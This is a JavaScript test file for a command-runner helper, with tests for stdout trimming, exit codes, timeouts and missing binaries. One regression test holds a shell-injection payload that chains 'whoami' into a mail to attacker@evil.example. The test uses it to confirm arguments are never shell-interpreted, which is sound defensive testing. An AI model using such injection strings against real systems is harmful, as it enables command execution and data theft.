import { describe, expect, it } from "vitest";
import { runCommand } from "./command-runner.js";

const node = process.execPath;

describe("runCommand", () => {
  it("resolves with trimmed stdout on success", async () => {
    const stdout = await runCommand({
      command: node,
      args: ["-e", "console.log('  hello  ')"],
      timeoutMs: 5000,
    });
    expect(stdout).toBe("hello");
  });

  it("rejects with the exit code and stderr on a non-zero exit", async () => {
    await expect(
      runCommand({
        command: node,
        args: ["-e", "console.error('boom'); process.exit(2)"],
        timeoutMs: 5000,
      }),
    ).rejects.toThrow(/salió con código 2.*boom/s);
  });

  it("kills the child and rejects once the timeout elapses", async () => {
    await expect(
      runCommand({
        command: node,
        args: ["-e", "setTimeout(() => {}, 5000)"],
        timeoutMs: 100,
      }),
    ).rejects.toThrow(/superó el timeout de 100ms/);
  });

  it("rejects when the command does not exist", async () => {
    await expect(
      runCommand({
        command: "this-binary-does-not-exist-aiquaa",
        args: [],
        timeoutMs: 5000,
      }),
    ).rejects.toThrow();
  });

  // Regresión: `spawn(cmd, args, { shell: true })` en Windows delega en
  // cmd.exe, que puede interpretar metacaracteres (`&`, `|`, `^`, `%VAR%`)
  // dentro de un elemento de `args` que en teoría es un único argumento
  // literal. Si algún día se reintroduce `shell: true` (o se cambia
  // cross-spawn por otra implementación), este test debe fallar porque el
  // argv recibido por el proceso hijo ya no coincidirá 1:1 con lo enviado.
  it("passes shell metacharacters through as literal argv, never interpreted by a shell", async () => {
    const payload = "& echo INJECTED & whoami | mail attacker@evil.example %PATH%";
    const stdout = await runCommand({
      command: node,
      args: ["-e", "console.log(JSON.stringify(process.argv.slice(1)))", payload],
      timeoutMs: 5000,
    });
    const receivedArgs = JSON.parse(stdout) as string[];
    expect(receivedArgs).toEqual([payload]);
  });
});
